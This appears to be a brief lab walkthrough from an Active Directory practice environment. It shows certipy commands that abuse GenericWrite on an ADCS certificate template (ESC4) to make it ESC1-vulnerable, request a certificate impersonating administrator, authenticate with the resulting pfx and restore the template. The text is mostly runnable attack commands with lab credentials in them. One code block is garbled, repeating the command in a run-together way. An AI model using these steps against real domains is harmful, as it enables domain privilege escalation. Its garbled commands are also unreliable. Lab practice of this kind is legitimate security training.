
Take the ESC4 template and change it to be vulnerable to ESC1 technique by using the genericWrite privilege we got. (we didn’t set the target here as we target the ldap)

`certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -save-configuration esc4.json -debug`

```
certipy template -kcertipy template -k -template ESC4 -save-configuration esc4.json -debug -template ESC4 -save-configuration esc4.json -debug
```

Target the CA server:
TIp: You can find the -ca by running your recon steps:
`certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC4 -ca ESSOS-CA -upn administrator@essos.local`

Exploit ESC1 on the modified ESC4 template:
`certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC4 -ca ESSOS-CA -upn administrator@essos.local`

Authentication with the pfx:
`certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12`

Rollback the template configuration:
`certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -configuration ESC4.json`

